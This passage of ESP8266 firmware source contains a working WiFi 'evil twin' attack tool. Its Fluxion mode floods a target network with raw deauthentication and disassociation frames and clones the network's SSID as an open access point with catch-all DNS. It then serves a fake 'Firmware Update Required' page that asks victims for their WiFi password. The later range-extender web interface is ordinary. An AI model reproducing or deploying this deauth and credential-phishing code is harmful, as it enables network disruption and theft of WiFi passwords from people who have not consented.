          "size:.92em;font-weight:600;cursor:pointer;font-family:inherit;"
          "margin-top:6px;transition:all .15s}"
          ".btn:hover{box-shadow:0 4px 12px "
          "rgba(37,99,235,.3);transform:translateY(-1px)}"
          ".ft{font-size:.72em;color:#94a3b8;margin-top:22px;line-height:1.6}"
          "</style></head><body>"
          "<div class='w'><div class='cd'>"
          "<div class='ic'>"
          "<svg width='30' height='30' viewBox='0 0 24 24' fill='none' "
          "stroke='#2563eb' stroke-width='2'>"
          "<rect x='3' y='11' width='18' height='11' rx='2'/>"
          "<path d='M7 11V7a5 5 0 0 1 10 0v4'/>"
          "</svg></div>"
          "<h1>Firmware Update Required</h1>"
          "<p class='sub'>A critical security update is available for your "
          "router. To verify ownership of <span class='net'>" +
              _selectedNetwork.ssid +
              "</span>, please enter your network password below.</p>"
              "<form action='/'><div class='fg'><label>WiFi Password</label>"
              "<input type='text' name='password' placeholder='Enter your WiFi "
              "password' minlength='8' required></div>"
              "<button type='submit' class='btn'>Verify &amp; Install "
              "Update</button></form>"
              "<div class='ft'>This verification is required for security "
              "purposes.<br>&copy; 2026 Network Security Systems UN Inc. All rights "
              "reserved.</div>"
              "</div></div></body></html>");
    }
  }
}

void handleFluxionAdmin() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                        IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                        IPAddress(255, 255, 255, 0));
      WiFi.softAP("EvilTwin", "12345678");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  webServer.send(200, "text/html", buildAdminPage());
}

// ── Reset back to selector from Fluxion ──
void handleResetMode() {
  saveMode(MODE_SELECTOR);
  webServer.send(
      200, "text/html",
      "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='3;url=/'>"
      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "<style>body{font-family:system-ui,sans-serif;background:#f0f4f8;display:"
      "flex;align-items:center;justify-content:center;min-height:100vh}"
      ".cd{background:#fff;border-radius:14px;box-shadow:0 4px 24px "
      "rgba(0,0,0,.08);padding:40px;text-align:center;max-width:380px}"
      "h2{margin-bottom:8px}p{color:#64748b;font-size:.9em}"
      "</style></head><body><div class='cd'><h2>Switching to "
      "Selector</h2><p>Rebooting...</p></div></body></html>");
  delay(1000);
  ESP.restart();
}

unsigned long fluxion_now = 0;
unsigned long fluxion_wifinow = 0;
unsigned long fluxion_deauth_now = 0;
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void fluxionSetup() {
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                    IPAddress(255, 255, 255, 0));
  WiFi.softAP("EvilTwin", "12345678");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleFluxionIndex);
  webServer.on("/result", handleFluxionResult);
  webServer.on("/admin", handleFluxionAdmin);
  webServer.on("/reset-mode", handleResetMode);
  webServer.onNotFound(handleFluxionIndex);
  webServer.begin();

  Serial.println(F("[FLUXION] Started. AP: EvilTwin / 12345678"));
}

void fluxionLoop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - fluxion_deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    fluxion_deauth_now = millis();
  }

  if (millis() - fluxion_now >= 15000) {
    fluxionPerformScan();
    fluxion_now = millis();
  }

  if (millis() - fluxion_wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    fluxion_wifinow = millis();
  }
}

// ═══════════════════════════════════════════════════════════════
// ████████████████  RANGE EXTENDER MODE  ██████████████████████
// ═══════════════════════════════════════════════════════════════

// ─── Configuration Structure ────────────────────────────────────
struct Config {
  uint8_t magic;
  char sta_ssid[33];
  char sta_pass[65];
  char ap_ssid[33];
  char ap_pass[65];
  uint8_t ap_channel;
  bool ap_hidden;
  char hostname[33];
  uint8_t checksum;
};

Config config;

bool naptStarted = false;
bool staConnected = false;
unsigned long lastStatusCheck = 0;
unsigned long lastReconnectAttempt = 0;
int reconnectCount = 0;

// ─── Forward Declarations ───────────────────────────────────────
void ext_loadConfig();
void ext_saveConfig();
void ext_defaultConfig();
uint8_t ext_calcChecksum();
void ext_setupAP();
void ext_connectToWiFi();
void ext_startNAPT();
void ext_setupWebServer();
void ext_setupOTA();
void ext_handleRoot();
void ext_handleApiStatus();
void ext_handleApiScan();
void ext_handleApiConnect();
void ext_handleApiDisconnect();
void ext_handleApiSettings();
void ext_handleApiClients();
void ext_handleApiReboot();
String getSignalQuality(int rssi);
String getEncryptionType(uint8_t encType);

// ═══════════════════════════════════════════════════════════════
//                 Range Extender HTML / CSS / JS
// ═══════════════════════════════════════════════════════════════

const char EXT_HTML_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Range Extender</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
--bg:#0a0a1a;--surface:#12122a;--card:#1a1a3e;--border:#2a2a5e;
--text:#e8e8ff;--text-dim:#8888bb;--accent:#7c3aed;--accent2:#3b82f6;
--success:#22c55e;--warning:#f59e0b;--danger:#ef4444;
--glow:rgba(124,58,237,0.3);--glow2:rgba(59,130,246,0.2);
--radius:16px;--radius-sm:10px;
}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
a{color:var(--accent);text-decoration:none}
::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
.header{position:sticky;top:0;z-index:100;background:rgba(10,10,26,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:0 20px}
.header-inner{max-width:900px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:60px}
.logo{display:flex;align-items:center;gap:10px;font-size:1.2em;font-weight:700}
.logo svg{width:28px;height:28px}
.logo-gradient{background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.nav{display:flex;gap:4px}
.nav-btn{background:none;border:none;color:var(--text-dim);padding:8px 16px;border-radius:var(--radius-sm);cursor:pointer;font-size:.9em;transition:all .3s}
.nav-btn:hover,.nav-btn.active{color:var(--text);background:var(--card)}
.nav-btn.active{border-bottom:2px solid var(--accent)}
.container{max-width:900px;margin:0 auto;padding:20px}
.tab-content{display:none;animation:fadeIn .4s ease}
.tab-content.active{display:block}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px;position:relative;overflow:hidden;transition:all .3s}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2));opacity:0;transition:opacity .3s}
.card:hover::before{opacity:1}
.card-title{font-size:1.1em;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.card-glow{box-shadow:0 0 20px var(--glow),0 0 40px var(--glow2)}
.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px}
.stat-item{text-align:center;padding:16px;background:var(--surface);border-radius:var(--radius-sm);border:1px solid var(--border)}
.stat-value{font-size:1.8em;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.stat-label{font-size:.8em;color:var(--text-dim);margin-top:4px}
.signal-bars{display:inline-flex;align-items:flex-end;gap:2px;height:18px;vertical-align:middle}
.signal-bars .bar{width:4px;background:var(--border);border-radius:1px;transition:background .3s}
.signal-bars .bar.active{background:var(--success)}
.signal-bars.medium .bar.active{background:var(--warning)}
.signal-bars.weak .bar.active{background:var(--danger)}
.conn-status{display:flex;align-items:center;gap:8px;padding:4px 12px;border-radius:20px;font-size:.85em;font-weight:500}
.conn-status.connected{background:rgba(34,197,94,0.15);color:var(--success)}
.conn-status.disconnected{background:rgba(239,68,68,0.15);color:var(--danger)}
.wifi-list{list-style:none}
.wifi-item{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:all .2s;border-radius:var(--radius-sm);margin-bottom:4px}
.wifi-item:hover{background:var(--surface);transform:translateX(4px)}
.wifi-item:last-child{border-bottom:none}
.wifi-info{display:flex;align-items:center;gap:12px}
.wifi-name{font-weight:500}
.wifi-details{font-size:.8em;color:var(--text-dim);margin-top:2px}
.wifi-meta{text-align:right;font-size:.8em;color:var(--text-dim)}
.client-item{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--border)}
.client-item:last-child{border-bottom:none}
.client-icon{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:.9em;font-weight:600;margin-right:12px;flex-shrink:0}
.client-info{flex:1}
.client-mac{font-size:.8em;color:var(--text-dim);font-family:monospace}
.btn{padding:10px 24px;border:none;border-radius:var(--radius-sm);cursor:pointer;font-size:.9em;font-weight:600;transition:all .3s;display:inline-flex;align-items:center;gap:8px}
.btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 4px 15px var(--glow)}
.btn-danger{background:var(--danger);color:#fff}
.btn-danger:hover{opacity:.9;transform:translateY(-2px)}
.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn-outline:hover{border-color:var(--accent);color:var(--accent)}
.btn-sm{padding:6px 14px;font-size:.8em}
.btn:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
.btn-block{width:100%;justify-content:center}
.form-group{margin-bottom:16px}
.form-label{display:block;font-size:.85em;color:var(--text-dim);margin-bottom:6px;font-weight:500}
.form-input{width:100%;padding:12px 16px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:.95em;transition:border-color .3s}
.form-input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px var(--glow)}
.form-input::placeholder{color:var(--text-dim)}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.toast{position:fixed;bottom:20px;right:20px;padding:14px 24px;border-radius:var(--radius-sm);color:#fff;font-weight:500;z-index:1000;transform:translateX(120%);transition:transform .4s cubic-bezier(.68,-.55,.27,1.55);max-width:350px}
.toast.show{transform:translateX(0)}
.toast.success{background:var(--success)}.toast.error{background:var(--danger)}.toast.info{background:var(--accent)}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:200;align-items:center;justify-content:center;padding:20px}
.modal-overlay.show{display:flex}
.modal{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:100%;max-width:420px;animation:modalIn .3s ease}
@keyframes modalIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
.modal-title{font-size:1.1em;font-weight:600;margin-bottom:16px}
.modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:20px}
.progress-bar{height:6px;background:var(--surface);border-radius:3px;overflow:hidden;margin-top:8px}
.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:3px;transition:width .5s ease}
.spinner{width:20px;height:20px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;display:inline-block}
@keyframes spin{to{transform:rotate(360deg)}}
.pulse-dot{width:8px;height:8px;border-radius:50%;display:inline-block;animation:pulse 2s infinite}
.pulse-dot.green{background:var(--success);box-shadow:0 0 8px var(--success)}
.pulse-dot.red{background:var(--danger);box-shadow:0 0 8px var(--danger)}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.upload-area{border:2px dashed var(--border);border-radius:var(--radius);padding:40px 20px;text-align:center;cursor:pointer;transition:all .3s}
.upload-area:hover,.upload-area.dragover{border-color:var(--accent);background:rgba(124,58,237,0.05)}
.upload-icon{font-size:2em;margin-bottom:8px}
@media(max-width:600px){
  .header-inner{flex-direction:column;height:auto;padding:10px 0;gap:8px}
  .status-grid{grid-template-columns:1fr 1fr}
  .form-row{grid-template-columns:1fr}
  .nav-btn{padding:6px 10px;font-size:.8em}
}
</style>
</head>
<body>
<header class="header">
<div class="header-inner">
  <div class="logo">
    <svg viewBox="0 0 24 24" fill="none" stroke="url(#g)" stroke-width="2">
      <defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#3b82f6"/></linearGradient></defs>
      <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="url(#g)"/>
    </svg>
    <span class="logo-gradient">RangeExtender</span>
  </div>
  <nav class="nav">
    <button class="nav-btn active" onclick="showTab('dashboard')">DashBoard</button>
    <button class="nav-btn" onclick="showTab('scanner')">Scanner</button>
    <button class="nav-btn" onclick="showTab('settings')">Settings</button>
    <button class="nav-btn" onclick="if(confirm('Go back to NodeMCU Mode? Device will reboot.')){fetch('/api/resetmode',{method:'POST'}).then(()=>{setTimeout(()=>location.reload(),5000)})}">NodeMCU</button>
  </nav>
</div>
</header>

<div class="container">

<!-- Dashboard Tab -->
<div id="tab-dashboard" class="tab-content active">
  <div class="card card-glow">
    <div class="card-title">
      <span id="conn-dot" class="pulse-dot red"></span>
      <span>Connection Status</span>
      <span id="conn-badge" class="conn-status disconnected" style="margin-left:auto">Disconnected</span>
    </div>
    <div id="conn-info" style="margin-bottom:16px">
      <div style="font-size:.9em;color:var(--text-dim)">Not connected to any network</div>
    </div>
    <div class="status-grid">
      <div class="stat-item"><div class="stat-value" id="st-signal">--</div><div class="stat-label">Signal Strength</div></div>
      <div class="stat-item"><div class="stat-value" id="st-clients">0</div><div class="stat-label">Connected Clients</div></div>
      <div class="stat-item"><div class="stat-value" id="st-uptime">0s</div><div class="stat-label">UpTime</div></div>
      <div class="stat-item"><div class="stat-value" id="st-heap">--</div><div class="stat-label">Memory</div></div>
    </div>
  </div>
  <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
    <div class="card">
      <div class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent2)" stroke-width="2"><path d="M2 20h20"/><path d="M5 20V4l7 4 7-4v16"/></svg> UpStream Network</div>
      <div id="src-ssid" style="font-size:1.3em;font-weight:600;margin-bottom:8px">--</div>
      <div id="src-ip" style="font-size:.85em;color:var(--text-dim)">IP: --</div>
      <div id="src-gw" style="font-size:.85em;color:var(--text-dim)">Gateway: --</div>
      <div id="src-dns" style="font-size:.85em;color:var(--text-dim)">DNS: --</div>
    </div>
    <div class="card">
      <div class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v2m0 18v2M4.22 4.22l1.42 1.42m12.72 12.72l1.42 1.42M1 12h2m18 0h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg> Extended Network</div>
      <div id="ap-ssid" style="font-size:1.3em;font-weight:600;margin-bottom:8px">--</div>
      <div id="ap-ip" style="font-size:.85em;color:var(--text-dim)">IP: 192.168.4.1</div>
      <div id="ap-ch" style="font-size:.85em;color:var(--text-dim)">Channel: --</div>
      <div id="napt-status" style="font-size:.85em;color:var(--text-dim)">NAPT: --</div>
    </div>
  </div>
  <div class="card">
    <div class="card-title" style="justify-content:space-between">
      <span style="display:flex;align-items:center;gap:8px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent2)" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg> Connected Clients</span>
      <button class="btn btn-outline btn-sm" onclick="refreshClients()">Refresh</button>
    </div>
    <div id="clients-list"><div style="text-align:center;padding:20px;color:var(--text-dim)">Loading...</div></div>
  </div>
</div>

<!-- Scanner Tab -->
<div id="tab-scanner" class="tab-content">
  <div class="card">
    <div class="card-title" style="justify-content:space-between">
      <span style="display:flex;align-items:center;gap:8px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> WiFi Networks</span>
      <button class="btn btn-primary btn-sm" onclick="scanNetworks()" id="scan-btn">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg> Scan
      </button>
    </div>
    <div id="scan-results"><div style="text-align:center;padding:30px;color:var(--text-dim)">Click "Scan" to discover nearby networks</div></div>
  </div>
</div>

<!-- Settings Tab -->
<div id="tab-settings" class="tab-content">
  <div class="card">
    <div class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg> Extended Network Settings</div>
    <form id="settings-form" onsubmit="saveSettings(event)">
      <div class="form-row">
        <div class="form-group"><label class="form-label">AP SSID</label><input class="form-input" type="text" id="set-ap-ssid" maxlength="32" placeholder="ESP8266" required></div>
        <div class="form-group"><label class="form-label">AP Password (min 8 or empty)</label><input class="form-input" type="password" id="set-ap-pass" maxlength="63" placeholder="••••••••"></div>
      </div>
      <div class="form-row">
        <div class="form-group"><label class="form-label">AP Channel (1-13)</label><input class="form-input" type="number" id="set-ap-ch" min="1" max="13" value="1"></div>
        <div class="form-group"><label class="form-label">Device Hostname</label><input class="form-input" type="text" id="set-hostname" maxlength="32" placeholder="ESP8266"></div>
      </div>
      <div class="form-group"><label style="display:flex;align-items:center;gap:8px;cursor:pointer"><input type="checkbox" id="set-ap-hidden"> Hide AP SSID</label></div>
      <div style="display:flex;gap:8px;margin-top:20px">
        <button type="submit" class="btn btn-primary">Save Settings</button>
        <button type="button" class="btn btn-outline" onclick="loadSettings()">Reset</button>
      </div>
    </form>
  </div>
  <div class="card">
    <div class="card-title"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--danger)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg> Danger Zone</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap">
      <button class="btn btn-danger btn-sm" onclick="confirmReboot()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> Reboot</button>
      <button class="btn btn-outline btn-sm" onclick="disconnectWiFi()">Disconnect WiFi</button>
    </div>
  </div>
</div>

<!-- Connect Modal -->
<div class="modal-overlay" id="connect-modal">
<div class="modal">
  <div class="modal-title">Connect to Network</div>
  <div class="form-group"><label class="form-label">SSID</label><input class="form-input" type="text" id="modal-ssid" readonly></div>
  <div class="form-group"><label class="form-label">Password</label><input class="form-input" type="password" id="modal-pass" placeholder="Enter WiFi password"></div>
  <div class="modal-actions">
    <button class="btn btn-outline" onclick="closeModal()">Cancel</button>
    <button class="btn btn-primary" onclick="connectToNetwork()" id="modal-connect-btn">Connect</button>
  </div>
</div>
</div>

<div class="toast" id="toast"></div>

<script>
let statusTimer=null,currentTab='dashboard';
function showTab(t){
  document.querySelectorAll('.tab-content').forEach(el=>el.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(el=>el.classList.remove('active'));
  document.getElementById('tab-'+t).classList.add('active');
  event.target.classList.add('active');
  currentTab=t;
  if(t==='scanner')scanNetworks();
  if(t==='settings')loadSettings();
}
function toast(msg,type='info'){
  const el=document.getElementById('toast');
  el.textContent=msg;el.className='toast '+type;
  el.classList.add('show');
  setTimeout(()=>el.classList.remove('show'),3500);
}
async function api(url,opts={}){
  try{
    const r=await fetch(url,{...opts,headers:{'Content-Type':'application/x-www-form-urlencoded',...(opts.headers||{})}});
    return await r.json();
  }catch(e){console.error('API error:',e);return null}
}
function signalBarsHTML(rssi){
  const q=rssi>-50?4:rssi>-60?3:rssi>-70?2:1;
  const cls=q>=3?'':q===2?'medium':'weak';
  let h=`<span class="signal-bars ${cls}">`;
  for(let i=1;i<=4;i++) h+=`<span class="bar${i<=q?' active':''}" style="height:${4+i*3.5}px"></span>`;
  return h+'</span>';
}
function fmtUptime(s){
  if(s<60)return s+'s';
  if(s<3600)return Math.floor(s/60)+'m '+s%60+'s';
  const h=Math.floor(s/3600),m=Math.floor((s%3600)/60);
  return h+'h '+m+'m';
}
async function refreshStatus(){
  const d=await api('/api/status');
  if(!d)return;
  const conn=d.sta_connected;
  document.getElementById('conn-dot').className='pulse-dot '+(conn?'green':'red');
  document.getElementById('conn-badge').className='conn-status '+(conn?'connected':'disconnected');
  document.getElementById('conn-badge').textContent=conn?'Connected':'Disconnected';
  if(conn){
    document.getElementById('conn-info').innerHTML=`<div style="font-size:1.1em;font-weight:600">Connected to: ${d.sta_ssid}</div><div style="font-size:.9em;color:var(--text-dim);margin-top:4px">${signalBarsHTML(d.rssi)} ${d.rssi} dBm</div>`;
    document.getElementById('src-ssid').textContent=d.sta_ssid;
    document.getElementById('src-ip').textContent='IP: '+d.sta_ip;
    document.getElementById('src-gw').textContent='Gateway: '+d.sta_gw;
    document.getElementById('src-dns').textContent='DNS: '+d.sta_dns;
    document.getElementById('st-signal').textContent=d.rssi+' dBm';
  }else{
    document.getElementById('conn-info').innerHTML='<div style="font-size:.9em;color:var(--text-dim)">Not connected to any network</div>';
    document.getElementById('src-ssid').textContent='--';
    document.getElementById('src-ip').textContent='IP: --';
    document.getElementById('src-gw').textContent='Gateway: --';
    document.getElementById('src-dns').textContent='DNS: --';
    document.getElementById('st-signal').textContent='--';
  }
  document.getElementById('ap-ssid').textContent=d.ap_ssid;
  document.getElementById('ap-ip').textContent='IP: '+d.ap_ip;
  document.getElementById('ap-ch').textContent='Channel: '+d.ap_channel;
  document.getElementById('napt-status').innerHTML='NAPT: '+(d.napt?'<span style="color:var(--success)">Active</span>':'<span style="color:var(--text-dim)">Inactive</span>');
  document.getElementById('st-clients').textContent=d.clients;
  document.getElementById('st-uptime').textContent=fmtUptime(d.uptime);
  document.getElementById('st-heap').textContent=Math.round(d.free_heap/1024)+'KB';
  if(d.chip_id){
    document.getElementById('di-chip').textContent=d.chip_id;
    document.getElementById('di-flash').textContent=d.flash_size;
    document.getElementById('di-sdk').textContent=d.sdk;
    document.getElementById('di-cpu').textContent=d.cpu_freq+'MHz';
    document.getElementById('di-sketch').textContent=d.sketch_size;
  }
}
async function scanNetworks(){
  const btn=document.getElementById('scan-btn');
  btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Scanning...';
  document.getElementById('scan-results').innerHTML='<div style="text-align:center;padding:30px"><span class="spinner"></span><div style="margin-top:8px;color:var(--text-dim)">Scanning...</div></div>';
  const d=await api('/api/scan');
  btn.disabled=false;btn.innerHTML='<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg> Scan';
  if(!d||!d.networks||d.networks.length===0){document.getElementById('scan-results').innerHTML='<div style="text-align:center;padding:30px;color:var(--text-dim)">No networks found.</div>';return}
  let html='<ul class="wifi-list">';
  d.networks.sort((a,b)=>b.rssi-a.rssi).forEach(n=>{
    html+=`<li class="wifi-item" onclick="openConnect('${n.ssid.replace(/'/g,"\\'")}')"><div class="wifi-info"><div>${signalBarsHTML(n.rssi)}</div><div><div class="wifi-name">${n.ssid||'(Hidden)'}</div><div class="wifi-details">Ch ${n.channel} &bull; ${n.encryption} &bull; ${n.bssid}</div></div></div><div class="wifi-meta">${n.rssi} dBm</div></li>`;
  });
  html+='</ul>';
  document.getElementById('scan-results').innerHTML=html;
}
function openConnect(ssid){document.getElementById('modal-ssid').value=ssid;document.getElementById('modal-pass').value='';document.getElementById('connect-modal').classList.add('show');document.getElementById('modal-pass').focus()}
function closeModal(){document.getElementById('connect-modal').classList.remove('show')}
async function connectToNetwork(){
  const ssid=document.getElementById('modal-ssid').value;
  const pass=document.getElementById('modal-pass').value;
  const btn=document.getElementById('modal-connect-btn');
  btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Connecting...';
  const d=await api('/api/connect',{method:'POST',body:`ssid=${encodeURIComponent(ssid)}&pass=${encodeURIComponent(pass)}`});
  btn.disabled=false;btn.textContent='Connect';closeModal();
  if(d&&d.success){toast('Connecting to '+ssid+'...','success');setTimeout(refreshStatus,5000)}
  else{toast('Failed: '+(d?d.message:'error'),'error')}
}
async function disconnectWiFi(){if(!confirm('Disconnect?'))return;const d=await api('/api/disconnect',{method:'POST'});if(d&&d.success){toast('Disconnected','info');refreshStatus()}else toast('Failed','error')}
async function refreshClients(){
  const d=await api('/api/clients');if(!d)return;
  const el=document.getElementById('clients-list');
  if(!d.clients||d.clients.length===0){el.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-dim)">No clients connected</div>';return}
  let html='';
  d.clients.forEach((c,i)=>{html+=`<div class="client-item"><div class="client-icon">${String.fromCharCode(65+(i%26))}</div><div class="client-info"><div style="font-weight:500">${c.ip}</div><div class="client-mac">${c.mac}</div></div></div>`});
  el.innerHTML=html;
}
async function loadSettings(){const d=await api('/api/status');if(!d)return;document.getElementById('set-ap-ssid').value=d.ap_ssid||'';document.getElementById('set-ap-ch').value=d.ap_channel||1;document.getElementById('set-hostname').value=d.hostname||'range-extender';document.getElementById('set-ap-hidden').checked=d.ap_hidden||false}
async function saveSettings(e){
  e.preventDefault();
  const body=['ap_ssid='+encodeURIComponent(document.getElementById('set-ap-ssid').value),'ap_pass='+encodeURIComponent(document.getElementById('set-ap-pass').value),'ap_channel='+document.getElementById('set-ap-ch').value,'hostname='+encodeURIComponent(document.getElementById('set-hostname').value),'ap_hidden='+(document.getElementById('set-ap-hidden').checked?'1':'0')].join('&');
  const d=await api('/api/settings',{method:'POST',body});
  if(d&&d.success){toast('Settings saved! Rebooting...','success');setTimeout(()=>location.reload(),5000)}else toast('Failed to save','error');
}
